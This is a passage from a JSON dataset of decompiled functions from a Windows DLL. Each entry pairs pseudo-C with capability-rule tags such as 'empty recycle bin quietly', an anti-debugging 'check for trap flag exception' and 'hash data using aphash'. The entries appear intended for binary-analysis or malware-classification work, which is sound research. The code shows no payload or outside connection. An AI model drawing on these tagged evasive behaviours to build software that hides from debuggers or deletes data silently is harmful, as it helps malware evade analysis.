fcn.18000aaf0(arg1_00, appppuStack88, &iStack328);\n        arg1_01 = fcn.1800687b0(auStack248);\n        ppppuVar6 = appppuStack88;\n        if (0xf < uStack64) {\n            ppppuVar6 = appppuStack88[0];\n        }\n        fcn.180069050(arg1_01, appppuStack288, ppppuVar6, iStack72 + ppppuVar6);\n        fcn.1800686c0(auStack248);\n        ppppuVar6 = appppuStack288;\n        if (7 < uStack264) {\n            ppppuVar6 = appppuStack288[0];\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x24ba, ppppuVar6);\n        if (uStack264 < 8) {\ncode_r0x00018003d4cc:\n            if (0xf < uStack64) {\n                ppppuVar6 = appppuStack88[0];\n                if ((0xfff < uStack64 + 1) &&\n                   (ppppuVar6 = appppuStack88[0][-1],  0x1f < appppuStack88[0] + (-8 - ppppuVar6)))\n                goto code_r0x00018003d574;\n                fcn.18008fb24(ppppuVar6);\n            }\n            goto code_r0x00018003d504;\n        }\n        ppppuVar6 = appppuStack288[0];\n        if ((uStack264 * 2 + 2 < 0x1000) ||\n           (ppppuVar6 = appppuStack288[0][-1],  appppuStack288[0] + (-8 - ppppuVar6) < 0x20)) {\n            fcn.18008fb24(ppppuVar6);\n            goto code_r0x00018003d4cc;\n        }\ncode_r0x00018003d56e:\n        fcn.1800b3528();\ncode_r0x00018003d574:\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x00018003d504:\n    if (uVar4 < 8) goto code_r0x00018003d53b;\n    piVar7 = piVar2;\n    if (0xfff < uVar4 * 2 + 2) {\n        piVar7 = piVar2[-1];\n        if (0x1f < piVar2 + (-8 - piVar7)) {\n            fcn.1800b3528();\n            goto code_r0x00018003d56e;\n        }\n    }\n    fcn.18008fb24(piVar7);\ncode_r0x00018003d53b:\n    fcn.18008fb00(uStack56 ^ auStack376);\n    return;\n}\n",
        "token_count": 1633
    },
    "18004536": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_bp_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180045360(int64_t arg1)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t arg1_00;\n    int64_t iVar8;\n    uint64_t uVar9;\n    ulong *puVar10;\n    ushort *puVar11;\n    uchar auStack152 [32];\n    ushort uStack120;\n    ushort uStack118;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong *var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint64_t var_40h;\n    uint64_t var_38h;\n    uint64_t var_30h;\n    ulong var_bp_20h;\n    ulong var_bp_18h;\n    ulong var_bp_10h;\n    \n    var_30h = *0x180123080 ^ auStack152;\n    uVar1 = *(arg1 + 0x80);\n    *(arg1 + 0x50) = 1;\n    iVar4 = (**0x1800de7f0)(uVar1, 0x188, 0, 0);\n    if (iVar4 == -1) {\n        uStack120 = 0;\n        uStack104 = *0x180101900;\n        uStack100 = *0x180101904;\n        uStack96 = *0x180101908;\n        uStack92 = *0x18010190c;\n        fcn.180010d70(&uStack120, 0x1800fa2a4, 0);\n    }\n    else {\n        iVar5 = (**0x1800de7f0)(uVar1, 0x18a, iVar4, 0);\n        var_38h = 7;\n        uVar9 = iVar5 + 1;\n        var_40h = 0;\n        var_50h = var_50h & 0xffffffffffff0000;\n        if (uVar9 < 8) {\n            var_40h = uVar9;\n            if (uVar9 != 0) {\n                puVar10 = &var_50h;\n                for (uVar7 = uVar9; uVar7 != 0; uVar7 = uVar7 - 1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 2;\n                }\n            }\n            *(&var_50h + uVar9 * 2) = 0;\n        }\n        else {\n            if (0x7ffffffffffffffe < uVar9) {\n                fcn.180014b60();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uVar6 = uVar9 | 7;\n            uVar7 = 0x7ffffffffffffffe;\n            if ((uVar6 < 0x7fffffffffffffff) && (uVar7 = uVar6,  uVar6 < 10)) {\n                uVar7 = 10;\n            }\n            iVar8 = uVar7 + 1;\n            if (uVar7 == 0xffffffffffffffff) {\n                iVar8 = -1;\n            }\n            var_50h = fcn.180011cf0(&var_50h, iVar8);\n            uVar6 = uVar9;\n            puVar10 = var_50h;\n            if (uVar9 != 0) {\n                for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 2;\n                }\n            }\n            *(var_50h + uVar9 * 2) = 0;\n            var_40h = uVar9;\n            var_38h = uVar7;\n        }\n        puVar10 = &var_50h;\n        if (7 < var_38h) {\n            puVar10 = var_50h;\n        }\n        (**0x1800de7f0)(uVar1, 0x189, iVar4, puVar10);\n        uStack120 = SUB82(var_50h, 0);\n        uStack118 = var_50h >> 0x10;\n        uStack116 = var_50h._4_4_;\n        uStack112 = uStack80;\n        uStack108 = uStack76;\n        uStack104 = var_40h;\n        uStack100 = var_40h._4_4_;\n        uStack96 = var_38h;\n        uStack92 = var_38h._4_4_;\n    }\n    puVar11 = &uStack120;\n    if (7 < CONCAT44(uStack92, uStack96)) {\n        puVar11 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n    }\n    iVar4 = (**0x1800de7f0)(*(arg1 + 0x88), 0x14c, 0xffffffffffffffff, puVar11);\n    uVar1 = *(arg1 + 0x88);\n    (**0x1800de7f0)(uVar1, 0x14e, iVar4, 0);\n    (**0x1800de5b8)(uVar1, 0, 0);\n    if (7 < CONCAT44(uStack92, uStack96)) {\n        iVar3 = CONCAT44(uStack116, CONCAT22(uStack118, uStack120));\n        iVar8 = CONCAT44(uStack92, uStack96) * 2;\n        arg1_00 = iVar3;\n        if (0xfff < iVar8 + 2U) {\n            arg1_00 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, iVar8 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *(arg1 + 0x50) = 0;\n    fcn.18008fb00(var_30h ^ auStack152);\n    return;\n}\n",
        "token_count": 1484
    },
    "18007f8d": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18007f8d8(ulong noname_0, uint *arg2, uint *arg3, int64_t arg4)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    ushort *puVar10;\n    char *pcVar11;\n    char *in_stack_00000030;\n    uint64_t in_stack_00000038;\n    uchar auStack232 [64];\n    uint uStack168;\n    uint uStack164;\n    ulong uStack160;\n    int64_t iStack152;\n    uint *puStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    char cStack96;\n    unkbyte7 Stack95;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint64_t uStack64;\n    \n    uStack136 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack232;\n    if ((in_stack_00000038 == 0) || (uVar8 = 1,  (*in_stack_00000030 - 0x2bU & 0xfd) != 0)) {\n        uVar8 = 0;\n    }\n    if (((((*(arg4 + 0x18) & 0xe00) == 0x800) && (uVar8 + 2 <= in_stack_00000038)) && (in_stack_00000030[uVar8] == '0'))\n       && ((in_stack_00000030[uVar8 + 1] + 0xa8U & 0xdf) == 0)) {\n        uVar8 = uVar8 + 2;\n    }\n    iVar6 = *(*(arg4 + 0x40) + 8);\n    uStack160 = iVar6;\n    iStack152 = arg4;\n    puStack144 = arg2;\n    (**0x1800de8f0)(iVar6);\n    uVar5 = fcn.180076930(&uStack168);\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6);\n    }\n    uStack112 = 0;\n    uStack104 = 7;\n    uStack128 = 0;\n    if (in_stack_00000038 < 8) {\n        uStack112 = in_stack_00000038;\n        if (in_stack_00000038 != 0) {\n            puVar10 = &uStack128;\n            for (uVar7 = in_stack_00000038; uVar7 != 0; uVar7 = uVar7 - 1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        (&uStack128)[in_stack_00000038] = 0;\n    }\n    else {\n        fcn.180075f80(&uStack128, in_stack_00000038);\n    }\n    puVar10 = &uStack128;\n    if (7 < uStack104) {\n        puVar10 = CONCAT62(Stack126, uStack128);\n    }\n    (**0x1800de8f0)(uVar5, in_stack_00000030, in_stack_00000030 + in_stack_00000038, puVar10);\n    iVar6 = *(*(arg4 + 0x40) + 8);\n    uStack160 = iVar6;\n    (**0x1800de8f0)(iVar6);\n    uVar5 = fcn.180077b3c(&uStack168);\n    iVar9 = 0;\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar5, &cStack96);\n    pcVar11 = &cStack96;\n    if (0xf < CONCAT44(uStack68, uStack72)) {\n        pcVar11 = CONCAT71(Stack95, cStack96);\n    }\n    if (*pcVar11 - 1U < 0x7e) {\n        (**0x1800de8f0)();\n        while (((cVar1 = *pcVar11,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < in_stack_00000038 - uVar8))) {\n            in_stack_00000038 = in_stack_00000038 - cVar1;\n            fcn.1800891dc(&uStack128, in_stack_00000038, 1);\n            if ('\\0' < pcVar11[1]) {\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n    }\n    uVar3 = uStack112;\n    uVar7 = *(arg4 + 0x28);\n    iVar6 = iVar9;\n    if ((0 < uVar7) && (uStack112 < uVar7)) {\n        iVar6 = uVar7 - uStack112;\n    }\n    uVar4 = *(arg4 + 0x18) & 0x1c0;\n    uStack168 = *arg3;\n    uStack164 = arg3[1];\n    uStack160._0_4_ = arg3[2];\n    uStack160._4_4_ = arg3[3];\n    uVar7 = uVar8;\n    if (uVar4 == 0x40) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n    }\n    else if (uVar4 == 0x100) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&uStack168);\n        }\n        iVar6 = 0;\n    }\n    else {\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&uStack168);\n        }\n        for (; iVar6 = iVar9,  uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n    }\n    *arg3 = uStack168;\n    arg3[1] = uStack164;\n    arg3[2] = uStack160;\n    arg3[3] = uStack160._4_4_;\n    for (iVar9 = uVar3 - uVar8; iVar9 != 0; iVar9 = iVar9 + -1) {\n        fcn.180078370(&uStack168);\n        arg4 = iStack152;\n    }\n    *(arg4 + 0x28) = 0;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        fcn.180078370(&uStack168);\n    }\n    *puStack144 = uStack168;\n    puStack144[1] = uStack164;\n    puStack144[2] = uStack160;\n    puStack144[3] = uStack160._4_4_;\n    uVar8 = CONCAT44(uStack68, uStack72);\n    if (0xf < uVar8) {\n        iVar9 = CONCAT71(Stack95, cStack96);\n        iVar6 = iVar9;\n        if (0xfff < uVar8 + 1) {\n            iVar6 = *(iVar9 + -8);\n            if (0x1f < (iVar9 - iVar6) - 8U) {\n                fcn.1800b3528(iVar6, uVar8 + 0x28);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar6);\n    }\n    uStack80 = *0x180101910;\n    uStack76 = *0x180101914;\n    uStack72 = *0x180101918;\n    uStack68 = *0x18010191c;\n    cStack96 = '\\0';\n    fcn.180003e40(&uStack128);\n    fcn.18008fb00(uStack64 ^ auStack232);\n    return;\n}\n",
        "token_count": 1990
    },
    "18007fd2": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18007fd28(ulong noname_0, uint *arg2, uint *arg3, int64_t arg4)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    ushort *puVar10;\n    char *pcVar11;\n    char *in_stack_00000030;\n    uint64_t in_stack_00000038;\n    uchar auStack232 [64];\n    uint uStack168;\n    uint uStack164;\n    ulong uStack160;\n    int64_t iStack152;\n    uint *puStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uint64_t uStack112;\n    uint64_t uStack104;\n    char cStack96;\n    unkbyte7 Stack95;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint64_t uStack64;\n    \n    uStack136 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack232;\n    if ((in_stack_00000038 == 0) || (uVar8 = 1,  (*in_stack_00000030 - 0x2bU & 0xfd) != 0)) {\n        uVar8 = 0;\n    }\n    if (((((*(arg4 + 0x18) & 0xe00) == 0x800) && (uVar8 + 2 <= in_stack_00000038)) && (in_stack_00000030[uVar8] == '0'))\n       && ((in_stack_00000030[uVar8 + 1] + 0xa8U & 0xdf) == 0)) {\n        uVar8 = uVar8 + 2;\n    }\n    iVar6 = *(*(arg4 + 0x40) + 8);\n    uStack160 = iVar6;\n    iStack152 = arg4;\n    puStack144 = arg2;\n    (**0x1800de8f0)(iVar6);\n    uVar5 = fcn.180014560(&uStack168);\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6);\n    }\n    uStack112 = 0;\n    uStack104 = 7;\n    uStack128 = 0;\n    if (in_stack_00000038 < 8) {\n        uStack112 = in_stack_00000038;\n        if (in_stack_00000038 != 0) {\n            puVar10 = &uStack128;\n            for (uVar7 = in_stack_00000038; uVar7 != 0; uVar7 = uVar7 - 1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        (&uStack128)[in_stack_00000038] = 0;\n    }\n    else {\n        fcn.180013c50(&uStack128, in_stack_00000038);\n    }\n    puVar10 = &uStack128;\n    if (7 < uStack104) {\n        puVar10 = CONCAT62(Stack126, uStack128);\n    }\n    (**0x1800de8f0)(uVar5, in_stack_00000030, in_stack_00000030 + in_stack_00000038, puVar10);\n    iVar6 = *(*(arg4 + 0x40) + 8);\n    uStack160 = iVar6;\n    (**0x1800de8f0)(iVar6);\n    uVar5 = fcn.180077c70(&uStack168);\n    iVar9 = 0;\n    if ((iVar6 != 0) && (iVar6 = (**0x1800de8f0)(iVar6),  iVar6 != 0)) {\n        (**0x1800de8f0)(iVar6, 1);\n    }\n    (**0x1800de8f0)(uVar5, &cStack96);\n    pcVar11 = &cStack96;\n    if (0xf < CONCAT44(uStack68, uStack72)) {\n        pcVar11 = CONCAT71(Stack95, cStack96);\n    }\n    if (*pcVar11 - 1U < 0x7e) {\n        (**0x1800de8f0)();\n        while (((cVar1 = *pcVar11,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < in_stack_00000038 - uVar8))) {\n            in_stack_00000038 = in_stack_00000038 - cVar1;\n            fcn.180089288(&uStack128, in_stack_00000038, 1);\n            if ('\\0' < pcVar11[1]) {\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n    }\n    uVar3 = uStack112;\n    uVar7 = *(arg4 + 0x28);\n    iVar6 = iVar9;\n    if ((0 < uVar7) && (uStack112 < uVar7)) {\n        iVar6 = uVar7 - uStack112;\n    }\n    uVar4 = *(arg4 + 0x18) & 0x1c0;\n    uStack168 = *arg3;\n    uStack164 = arg3[1];\n    uStack160._0_4_ = arg3[2];\n    uStack160._4_4_ = arg3[3];\n    uVar7 = uVar8;\n    if (uVar4 == 0x40) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n    }\n    else if (uVar4 == 0x100) {\n        for (; uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&uStack168);\n        }\n        iVar6 = 0;\n    }\n    else {\n        for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n            fcn.180078370(&uStack168);\n        }\n        for (; iVar6 = iVar9,  uVar7 != 0; uVar7 = uVar7 - 1) {\n            fcn.180078370(&uStack168);\n            arg4 = iStack152;\n        }\n    }\n    *arg3 = uStack168;\n    arg3[1] = uStack164;\n    arg3[2] = uStack160;\n    arg3[3] = uStack160._4_4_;\n    for (iVar9 = uVar3 - uVar8; iVar9 != 0; iVar9 = iVar9 + -1) {\n        fcn.180078370(&uStack168);\n        arg4 = iStack152;\n    }\n    *(arg4 + 0x28) = 0;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        fcn.180078370(&uStack168);\n    }\n    *puStack144 = uStack168;\n    puStack144[1] = uStack164;\n    puStack144[2] = uStack160;\n    puStack144[3] = uStack160._4_4_;\n    uVar8 = CONCAT44(uStack68, uStack72);\n    if (0xf < uVar8) {\n        iVar9 = CONCAT71(Stack95, cStack96);\n        iVar6 = iVar9;\n        if (0xfff < uVar8 + 1) {\n            iVar6 = *(iVar9 + -8);\n            if (0x1f < (iVar9 - iVar6) - 8U) {\n                fcn.1800b3528(iVar6, uVar8 + 0x28);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar6);\n    }\n    uStack80 = *0x180101910;\n    uStack76 = *0x180101914;\n    uStack72 = *0x180101918;\n    uStack68 = *0x18010191c;\n    cStack96 = '\\0';\n    fcn.180003e40(&uStack128);\n    fcn.18008fb00(uStack64 ^ auStack232);\n    return;\n}\n",
        "token_count": 1986
    },
    "180015f4": {
        "rules": [
            "check for trap flag exception/195424436e83481b9cb8f317a67cc52a"
        ],
        "decompiled_code": "\nvoid fcn.180015f40(int64_t arg1, int64_t arg2, ulong *arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uchar auStack392 [32];\n    int64_t iStack360;\n    uint uStack352;\n    uint uStack344;\n    ulong uStack328;\n    uchar auStack312 [64];\n    uchar auStack248 [64];\n    int64_t iStack184;\n    ulong uStack176;\n    int64_t iStack168;\n    int64_t iStack144;\n    uint32_t uStack124;\n    uint64_t uStack72;\n    \n    uStack328 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack392;\n    iVar3 = *arg4;\n    if (iVar3 == 0) goto code_r0x00018001611c;\n    fcn.1800ae290(auStack312, 0, 0xe8);\n    uStack344 = *(iVar3 + 0x20);\n    uStack352 = *(iVar3 + 0x28);\n    iStack360 = iVar3;\n    fcn.1800162e0(auStack312, arg1, arg2, arg4 + 1);\n    cVar2 = fcn.1800171c0(auStack312, arg3);\n    if (cVar2 == '\\0') {\n        if ((arg1 != arg2) && ((in_stack_00000028 & 0x40) == 0)) {\n            uStack124 = uStack124 & 0xffffdfff | 0x100;\n            for (iVar3 = fcn.180016e30(auStack312, arg1 + 2, arg2, 0); iVar3 != arg2;\n                iVar3 = fcn.180016e30(auStack312, iVar3 + 2, arg2, 0)) {\n                iStack144 = iVar3;\n                cVar2 = fcn.1800171c0(auStack312, arg3);\n                if (cVar2 != '\\0') goto code_r0x000180016084;\n            }\n            iStack144 = arg2;\n            cVar2 = fcn.1800171c0(auStack312, arg3);\n            if (cVar2 != '\\0') goto code_r0x000180016084;\n        }\n    }\n    else {\ncode_r0x000180016084:\n        if (arg3 != NULL) {\n            *arg3 = in_stack_00000030;\n            arg3[5] = arg1;\n            *(arg3 + 7) = arg1 != arg3[6];\n        }\n    }\n    if (iStack184 != 0) {\n        uVar4 = iStack168 - iStack184 & 0xfffffffffffffff0;\n        iVar3 = iStack184;\n        if (0xfff < uVar4) {\n            iVar3 = *(iStack184 + -8);\n            if (0x1f < (iStack184 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        iStack184 = 0;\n        uStack176 = 0;\n        iStack168 = 0;\n    }\n    fcn.1800161d0(auStack248);\n    fcn.1800161d0(auStack312);\ncode_r0x00018001611c:\n    fcn.18008fb00(uStack72 ^ auStack392);\n    return;\n}\n",
        "token_count": 854
    },
    "18003058": {
        "rules": [
            "check for trap flag exception/195424436e83481b9cb8f317a67cc52a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Removing unreachable block (ram,0x0001800306f4)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180030580(ulong *arg1, ulong *arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uchar uVar1;\n    uint64_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    ulong in_stack_00000028;\n    ulong *in_stack_00000030;\n    uchar auStack280 [32];\n    uint64_t uStack248;\n    uint64_t uStack240;\n    uint64_t uStack232;\n    ulong uStack224;\n    ulong *puStack216;\n    ulong uStack208;\n    uchar auStack192 [8];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [7];\n    ulong var_79h;\n    ulong var_71h;\n    ulong var_69h;\n    ulong var_61h;\n    ulong var_59h;\n    ulong var_51h;\n    ulong var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    uStack208 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack280;\n    uStack224 = in_stack_00000028;\n    iVar11 = 0;\n    auStack184 = ZEXT916(0);\n    auStack168 = ZEXT816(0);\n    auStack152 = ZEXT816(0);\n    _auStack136 = ZEXT916(0);\n    unique0x100000fc = ZEXT816(0);\n    stack0xffffffffffffff98 = ZEXT816(0) & 0xffffffffffffff00;\n    stack0xffffffffffffffa8 = ZEXT916(0);\n    uStack248 = uStack248 & 0xffffffff00000000;\n    uStack240 = arg3;\n    uStack232 = arg4;\n    puStack216 = arg1;\n    cVar3 = fcn.180030c10(arg3, arg4, auStack184, in_stack_00000028);\n    iVar9 = iVar11;\n    while (cVar3 != '\\0') {\n        auStack152._8_8_ = SUB168(auStack152 >> 0x40, 0);\n        iVar10 = _auStack136 - auStack152._8_8_;\n        if (_auStack136 < auStack152._8_8_) {\n            iVar10 = iVar11;\n        }\n        iVar8 = iVar11;\n        if (iVar10 != 0) {\n            do {\n                uVar1 = *auStack152._8_8_;\n                uVar2 = arg2[2];\n                if (uVar2 < arg2[3]) {\n                    arg2[2] = uVar2 + 1;\n                    puVar7 = arg2;\n                    if (0xf < arg2[3]) {\n                        puVar7 = *arg2;\n                    }\n                    *(puVar7 + uVar2) = uVar1;\n                    *(puVar7 + uVar2 + 1) = 0;\n                }\n                else {\n                    fcn.180013eb0(arg2, 1);\n                }\n                auStack152._8_8_ = auStack152._8_8_ + 1;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 != iVar10);\n        }\n        puVar7 = in_stack_00000030;\n        if (0xf < in_stack_00000030[3]) {\n            puVar7 = *in_stack_00000030;\n        }\n        uStack248 = in_stack_00000030[2] + puVar7;\n        puVar7 = in_stack_00000030;\n        if (0xf < in_stack_00000030[3]) {\n            puVar7 = *in_stack_00000030;\n        }\n        arg2 = fcn.180031ea0(auStack192, auStack184, arg2, puVar7);\n        arg4 = uStack232;\n        arg2 = *arg2;\n        iVar10 = auStack168._8_8_ - auStack168._0_8_ >> 0x3f;\n        iVar8 = (auStack168._8_8_ - auStack168._0_8_) / 0x18 + iVar10;\n        piVar5 = &var_59h + 1;\n        if (iVar8 != iVar10) {\n            piVar5 = auStack168._0_8_;\n        }\n        arg3 = piVar5[1];\n        if (arg3 == uStack232) break;\n        piVar5 = &var_59h + 1;\n        if (iVar8 != iVar10) {\n            piVar5 = auStack168._0_8_;\n        }\n        piVar6 = &var_59h + 1;\n        if (iVar8 != iVar10) {\n            piVar6 = auStack168._0_8_;\n        }\n        if (*piVar5 != piVar6[1]) {\n            iVar9 = 0x100;\n        }\n        uVar4 = 0x2000;\n        if (*piVar5 != piVar6[1]) {\n            uVar4 = 0;\n        }\n        uStack248 = uStack248 & 0xffffffff00000000 | uVar4 | iVar9;\n        uStack240 = arg3;\n        cVar3 = fcn.180030c10(arg3, uStack232, auStack184, uStack224);\n    }\n    iVar9 = arg4 - arg3;\n    if (arg4 < arg3) {\n        iVar9 = iVar11;\n    }\n    if (iVar9 != 0) {\n        do {\n            uVar1 = *(iVar11 + arg3);\n            uVar2 = arg2[2];\n            if (uVar2 < arg2[3]) {\n                arg2[2] = uVar2 + 1;\n                puVar7 = arg2;\n                if (0xf < arg2[3]) {\n                    puVar7 = *arg2;\n                }\n                *(puVar7 + uVar2) = uVar1;\n                *(puVar7 + uVar2 + 1) = 0;\n            }\n            else {\n                fcn.180013eb0(arg2, 1);\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 != iVar9);\n    }\n    *puStack216 = arg2;\n    fcn.1800159b0(auStack168);\n    fcn.18008fb00(stack0xffffffffffffffb8 ^ auStack280);\n    return;\n}\n",
        "token_count": 1655
    },
    "180030c1": {
        "rules": [
            "check for trap flag exception/195424436e83481b9cb8f317a67cc52a"
        ],
        "decompiled_code": "\nvoid fcn.180030c10(int64_t arg1, int64_t arg2, ulong *arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uchar auStack392 [32];\n    int64_t iStack360;\n    uint uStack352;\n    uint uStack344;\n    ulong uStack328;\n    uchar auStack312 [64];\n    uchar auStack248 [64];\n    int64_t iStack184;\n    ulong uStack176;\n    int64_t iStack168;\n    int64_t iStack144;\n    uint32_t uStack124;\n    uint64_t uStack72;\n    \n    uStack328 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack392;\n    iVar3 = *arg4;\n    if (iVar3 == 0) goto code_r0x000180030dec;\n    fcn.1800ae290(auStack312, 0, 0xe8);\n    uStack344 = *(iVar3 + 0x20);\n    uStack352 = *(iVar3 + 0x28);\n    iStack360 = iVar3;\n    fcn.1800162e0(auStack312, arg1, arg2, arg4 + 1);\n    cVar2 = fcn.180031a00(auStack312, arg3);\n    if (cVar2 == '\\0') {\n        if ((arg1 != arg2) && ((in_stack_00000028 & 0x40) == 0)) {\n            uStack124 = uStack124 & 0xffffdfff | 0x100;\n            for (iVar3 = fcn.180031710(auStack312, arg1 + 1, arg2, 0); iVar3 != arg2;\n                iVar3 = fcn.180031710(auStack312, iVar3 + 1, arg2, 0)) {\n                iStack144 = iVar3;\n                cVar2 = fcn.180031a00(auStack312, arg3);\n                if (cVar2 != '\\0') goto code_r0x000180030d54;\n            }\n            iStack144 = arg2;\n            cVar2 = fcn.180031a00(auStack312, arg3);\n            if (cVar2 != '\\0') goto code_r0x000180030d54;\n        }\n    }\n    else {\ncode_r0x000180030d54:\n        if (arg3 != NULL) {\n            *arg3 = in_stack_00000030;\n            arg3[5] = arg1;\n            *(arg3 + 7) = arg1 != arg3[6];\n        }\n    }\n    if (iStack184 != 0) {\n        uVar4 = iStack168 - iStack184 & 0xfffffffffffffff0;\n        iVar3 = iStack184;\n        if (0xfff < uVar4) {\n            iVar3 = *(iStack184 + -8);\n            if (0x1f < (iStack184 - iVar3) - 8U) {\n                fcn.1800b3528(iVar3, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n        iStack184 = 0;\n        uStack176 = 0;\n        iStack168 = 0;\n    }\n    fcn.1800161d0(auStack248);\n    fcn.1800161d0(auStack312);\ncode_r0x000180030dec:\n    fcn.18008fb00(uStack72 ^ auStack392);\n    return;\n}\n",
        "token_count": 850
    },
    "1800171c": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
